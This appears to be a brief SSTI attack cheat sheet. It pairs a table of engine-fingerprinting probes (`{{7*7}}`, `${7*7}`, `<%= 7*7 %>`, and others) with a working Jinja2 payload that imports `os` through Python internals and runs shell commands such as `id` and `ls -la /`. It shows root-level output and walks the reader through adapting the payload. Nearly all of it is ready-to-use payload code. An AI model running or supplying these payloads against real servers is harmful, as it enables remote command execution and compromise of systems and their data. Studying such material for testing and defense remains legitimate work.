
If you find a field which is vulnerable to SSTI, use the following to test which kind of server it is and the responses:

| Payload      | Engine                         | Result                                               |
| ------------ | ------------------------------ | ---------------------------------------------------- |
| `{{7*7}}`    | Jinja2, Twig                   | `49`                                                 |
| `${7*7}`     | FreeMarker, Velocity (sort of) | `49`                                                 |
| `#{7*7}`     | some older engines             | `49`                                                 |
| `<%= 7*7 %>` | ERB (Ruby)                     | `49`                                                 |
| `{{7*'7'}}`  | Jinja2                         | `7777777` (Python string repeat) vs Twig would error |

Whichever one reflects `49` is where you wanna go

For Jina2 try this now:
``` 
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
If it works the output should look like this:
``` *output*
# uid=0(root) gid=0(root) groups=0(root)
```
You can edit the payload like this to look around:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}
```